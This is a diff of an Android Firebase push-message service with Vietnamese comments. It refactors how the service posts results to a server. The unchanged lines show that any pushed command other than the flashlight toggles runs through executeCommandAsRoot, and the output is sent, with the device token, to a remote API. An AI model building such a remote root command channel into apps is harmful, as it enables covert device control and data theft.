@@ -16,6 +16,7 @@ import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 
 
@@ -38,16 +39,18 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                     toggleFlash(true)
                     "flash on"
                 }
+
                 "flash off" -> {
                     toggleFlash(false)
                     "flash off"
                 }
+
                 else -> executeCommandAsRoot(command)
             }
 
             // Lấy FCM Token của thiết bị và gửi response
             FirebaseMessaging.getInstance().token.addOnSuccessListener { token ->
-                sendResponseToServer(token, responseMessage)
+                sendResponseToServer(token, responseMessage ?: "null")
             }
         }
     }
@@ -89,19 +92,22 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
     /**
      * Gửi response về API.
      */
-    private fun sendResponseToServer(fcmToken: String, message: String) {
+    private fun sendResponseToServer(fcmToken: String, message: String?) {
+        val safeMessage = message?.takeIf { it.isNotBlank() } ?: "no response"
+
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val client = OkHttpClient()
                 val json = JSONObject().apply {
                     put("fcmTokenDevice", fcmToken)
-                    put("message", message)
+                    put("message", safeMessage)  // Luôn có giá trị, không bị rỗng
                 }
 
-                val body = RequestBody.create("application/json".toMediaTypeOrNull(), json.toString())
+                val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                 val request = Request.Builder()
                     .url(API_URL)
                     .post(body)
+                    .addHeader("Content-Type", "application/json")
                     .build()
 
                 val response = client.newCall(request).execute()
